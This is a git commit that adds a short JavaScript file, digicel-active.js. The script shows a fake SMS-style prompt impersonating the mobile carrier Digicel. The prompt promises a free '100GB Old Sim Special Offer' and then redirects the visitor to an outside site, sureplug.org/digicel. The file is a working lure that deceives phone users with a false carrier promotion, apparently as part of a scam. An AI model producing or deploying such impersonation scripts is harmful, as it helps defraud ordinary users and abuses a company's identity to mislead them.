96ce714a4318744340b8e6b6faec09be0c419798
surepluger <adigunkola666@gmail.com>
2025-03-27 13:10:07 +0100

    Create digicel-active.js

---
+++ digicel-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 100GB'
+password=prompt('SMS: Congratulations, your sim card is qualify to receive 100GB Old Sim Special Offer, Press Ok To Activate Now ','ACTIVATE 100GB');
+if (password != 'ACTIVATE 100GB') {
+location.href='https://sureplug.org/digicel';
+}
